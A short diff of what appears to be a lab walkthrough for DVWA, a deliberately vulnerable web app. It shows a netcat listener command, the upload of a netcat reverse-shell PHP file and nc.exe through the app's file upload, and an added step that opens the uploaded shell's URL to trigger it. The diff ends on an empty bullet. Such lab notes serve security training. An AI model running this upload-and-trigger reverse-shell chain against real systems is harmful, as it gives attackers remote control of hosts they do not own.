@@ -184,3 +184,9 @@ sudo nc -l -p <port-number>
 ```
 
 - Upload Netcat reverse shell and `nc.exe` on the file to DVWA file upload
+- Browse to Reverse Shell
+```
+http://Win10-IP/dvwa-master/hackable/uploads/nc-reverse-shell.php
+```
+
+- 
